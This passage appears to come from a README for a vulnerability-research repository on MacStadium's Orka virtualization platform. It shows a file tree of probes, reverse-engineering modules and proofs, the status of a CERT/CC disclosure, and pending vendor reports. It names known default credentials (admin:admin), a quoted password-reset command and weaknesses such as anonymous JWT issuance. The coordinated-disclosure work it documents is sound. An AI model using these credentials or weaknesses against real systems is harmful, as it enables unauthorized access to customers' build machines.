│   │   ├── harbor-discovery.md          — 4 registries, anon JWT, OCI format
│   │   └── registry.md                  — tahoe-base anatomy: overlaps, gaps, supply chain vector
│   ├── licensespring-intel.json
│   ├── network/topology.md              — full IP map
│   └── nfs/isodrive.md                  — world-writable ISOs, malware found
│
├── packages/
│   ├── orka-engine-3.5.2.pkg            — XAR archive (gitignored — large)
│   ├── orka-vm-tools.pkg                — XAR archive (gitignored — large)
│   └── extracted/
│       ├── orka-engine/                 — full pkg tree (plists, binaries, CodeSignature, profiles)
│       └── orka-vm-tools/              — full pkg tree (LaunchAgent, LaunchDaemon, resize script)
│
├── proofs/
│   ├── APPLE-PROPRIETARY-SOURCE-CODE-PROOF.md   — 7 findings: anon JWT, AAR format, Claris, GlobalProtect
│   ├── RUNVZ-AAR-BINARY-PROOF.md                — 10 findings: demangled Swift symbols, AppleArchive linkage
│   ├── RUNVZ-AAR-BINARY-PROOF-v2.md
│   ├── LICENSESPRING-HARDCODED-KEYS-PROOF.md
│   └── runvz-strings-proof.txt                  — annotated strings from runvz binary
│
├── reporting/
│   ├── VINCE-macstadium-2026-08-17-FINAL.md     — CERT/CC VRF#26-08-DYBJT submission
│   └── VINCE-macstadium-2026-08-17.md
│
├── tools/
│   ├── ablation-modules/                — 5 binary RE modules (orka JWT, OIDC, API, VM exec, enum)
│   └── probes/                          — pprof probe, API inspector, cluster enumerator, load tool
│
└── vulnerabilities/
    └── VULNERABILITIES-macstadium-vpn-orka.md   — full 24-finding report
```

---

## Disclosure Status

**VRF#26-08-DYBJT** — submitted to CERT/CC VINCE 2026-08-18.  
**Status: Closed.** CERT/CC response: direct vendor contact required before case acceptance.

**Pending actions:**

1. **MacStadium** — `support@macstadium.com`  
   Reference: VU-01 through VU-24. Request 90-day embargo. Attach VINCE final report.  
   Include malware finding (svchost.exe + JxjEKoTV.exe on NFS) as separate active incident — this is not a disclosure item, this is an incident response item.

2. **Apple** — `https://support.apple.com/en-us/102549`  
   Reference: A1 (anonymous JWT, zero credentials), A2 (AppleArchive statically linked + distributed), A3 (Claris subsidiary exposure), VU-07 (admin:admin in all Apple macOS VMs).

3. **CERT/CC follow-up** — If no vendor response after 2 weeks, email `cert@cert.org` referencing VRF#26-08-DYBJT to re-open for coordinated disclosure.

---

## References

- [CVE-2020-26160](https://nvd.nist.gov/vuln/detail/CVE-2020-26160) — dgrijalva/jwt-go VerifyAudience bypass
- [macstadium/packer-plugin-macstadium-orka](https://github.com/macstadium/packer-plugin-macstadium-orka) — `defaultPassword = "admin"` (20 commits, unchanged since 2020)
- [macstadium/orka-images](https://github.com/macstadium/orka-images) — PR #26: `sysadminctl -resetPasswordFor admin -newPassword admin` for macOS 26 Tahoe
- [macstadium/orka-integrations](https://github.com/macstadium/orka-integrations) — Buildkite `bootstrap.sh`: `ORKA_TOKEN` over HTTP + `ssh -A`
- [macstadium/orka-actions-connect](https://github.com/macstadium/orka-actions-connect) — `connect.sh`: GitHub PAT → IMDS
- [macstadium/orka3-cli-agent-skill](https://github.com/macstadium/orka3-cli-agent-skill) — `SKILL.md`: `admin/admin` documented
- [macstadium/ansible-playbook-osx-ci-setup](https://github.com/macstadium/ansible-playbook-osx-ci-setup) — `allow_world_readable_tmpfiles=true`
- [macstadium/vergeos-exporter](https://github.com/macstadium/vergeos-exporter) — unauthenticated `:9888/metrics`
- CWE-347, CWE-798, CWE-200, CWE-522, CWE-829, CWE-284, CWE-732, CWE-319, CWE-352, CWE-215
